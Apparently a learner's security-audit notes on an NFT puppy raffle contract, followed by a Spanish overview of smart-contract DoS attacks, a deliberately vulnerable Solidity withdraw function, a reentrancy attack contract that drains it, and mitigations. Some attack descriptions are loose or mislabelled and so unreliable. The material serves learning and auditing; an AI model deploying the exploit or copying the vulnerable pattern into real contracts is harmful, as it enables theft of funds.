# Protocol Objectives:

1. This project is to enter a raffle to win a cute dog NFT
2. Call the enterRaffle function with the following parameters:
address[] participants: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.  
3. Duplicate addresses are not allowed
//@audit says "... duplicate addresses are not allowed" but says what "...You can use this to enter yourself multiple times"
4. Users are allowed to get a refund of their ticket & value if they call the refund function
5. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
6. The owner of the protocol will set a feeAddress to take a cut of the value, and the rest of the funds will be sent to the winner of the puppy.

# Roles

Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the `changeFeeAddress` function.
Player - Participant of the raffle, has the power to enter the raffle with the `enterRaffle` function and refund value through `refund` function.

Audit notes:
//@audit Protocol Objectives says "... duplicate addresses are not allowed" but says what "...You can use this to enter yourself multiple times"
// @audit this repo says what the right commit is 2a47715b30cf11ca82db148704e67652ad679cd8, but the commit related repo says what the right commit is e30d199697bbc822b646d76533b66b7d529b8ef5
// @? Solc Version: 0.7.6 is hackeable?


### Ataques conocidos de Denegación de Servicio (DoS) en contratos inteligentes

1. **Bloqueo de Gas (Gas Limit Exhaustion)**:
   - **Descripción**: Un atacante envía transacciones que consumen mucho gas para llenar los bloques y alcanzar el `block gas limit`.
   - **Impacto**: Retrasa las transacciones legítimas, causando congestión en la red.

2. **Bloqueo de Reembolso (Refund DoS)**:
   - **Descripción**: Un atacante explota la mecánica de reembolso de gas en Ethereum, llenando el bloque con transacciones que generan reembolsos.
   - **Impacto**: Reduce la cantidad de gas disponible para otras transacciones, causando retrasos.

3. **Bloqueo de Bucle Infinito (Unbounded Loop)**:
   - **Descripción**: Un contrato inteligente contiene un bucle que puede ejecutarse indefinidamente si se dan ciertas condiciones.
   - **Impacto**: Consume todo el gas disponible, causando que la transacción falle y potencialmente bloqueando el contrato.

4. **Bloqueo de Revert (Revert DoS)**:
   - **Descripción**: Un atacante llama a una función que siempre revierte (revert) la transacción.
   - **Impacto**: Consume gas sin realizar ninguna operación útil, causando congestión.

5. **Bloqueo de Reentrada (Reentrancy Attack)**:
   - **Descripción**: Un atacante explota una vulnerabilidad de reentrada para llamar repetidamente a una función antes de que la llamada anterior haya terminado.
   - **Impacto**: Puede drenar fondos del contrato o causar que el contrato se quede sin gas.

6. **Bloqueo de Transacciones Prioritarias (Transaction Ordering Dependence)**:
   - **Descripción**: Un atacante manipula el orden de las transacciones para obtener un beneficio indebido.
   - **Impacto**: Puede causar que las transacciones legítimas se retrasen o fallen.

7. **Bloqueo de Eventos (Event Flooding)**:
   - **Descripción**: Un atacante genera una gran cantidad de eventos en un contrato inteligente.
   - **Impacto**: Inunda los logs de eventos, dificultando el seguimiento de eventos legítimos.

### Ejemplo de Reentrancy Attack en Solidity

```solidity
pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success);
        balances[msg.sender] -= _amount;
    }
}
```

### Ejemplo de Ataque de Reentrada

```solidity
pragma solidity ^0.8.0;

contract AttackContract {
    VulnerableContract public vulnerable;

    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    function attack() public payable {
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vulnerable).balance >= msg.value) {
            vulnerable.withdraw(msg.value);
        }
    }
}
```

### Mitigación de Ataques DoS

1. **Límites de Gas**: Establecer límites de gas adecuados para funciones.
2. **Chequeos de Estado**: Realizar chequeos de estado antes de realizar operaciones críticas.
3. **Patrón de Retiro**: Utilizar el patrón de retiro en lugar de enviar fondos directamente.
4. **Control de Acceso**: Implementar controles de acceso adecuados para funciones críticas.
5. **Auditorías de Seguridad**: Realizar auditorías de seguridad regulares del código del contrato inteligente.

Si tienes más preguntas sobre desarrollo de software o blockchain, estaré encantado de ayudarte.
